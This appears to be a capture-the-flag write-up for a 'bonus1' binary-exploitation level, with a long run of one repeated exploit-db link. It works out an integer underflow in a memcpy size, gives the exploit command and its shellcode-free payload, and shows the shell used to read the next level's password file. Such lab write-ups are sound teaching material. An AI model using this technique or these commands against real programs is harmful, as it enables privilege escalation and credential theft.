# OK
 
 # We have atoi and memcpy, we read the asm and get that the prog get 2 args
 # The prog create a buff[40], then check if arg[1] < 9 or exit, after that it memcpy(buff, arg[2], arg[1] * sizeof(int))
 # And ultimatly, check if %esp == 0x574f4c46 and execl /bin/sh
 # We go for a Integer underflow, the point is to allocte a negative value and make it allocate a positive value, for that we use the property of int_min

# How to calculate the underflow, READ THE DOC AHAHAHAH
 https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf
 https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf
 https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf https://www.exploit-db.com/docs/english/28477-linux-integer-overflow-and-underflow.pdf


UINT_MAX = 4294967295
Theorique UINT_MIN = -4294967295 - 1
44 is the number of bytes we want to cpy (buffer[40] + compared value)
We divide by 4 bc malloc(sizeof(int) * av[0])
(-4294967296 + 44) / 4 = 1073741813


undefined buff [40];  # stocker a la suite coller coller
int m;
....
if (m == 0x574f4c46) {
 execl("/bin/sh","sh",0);
}

./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
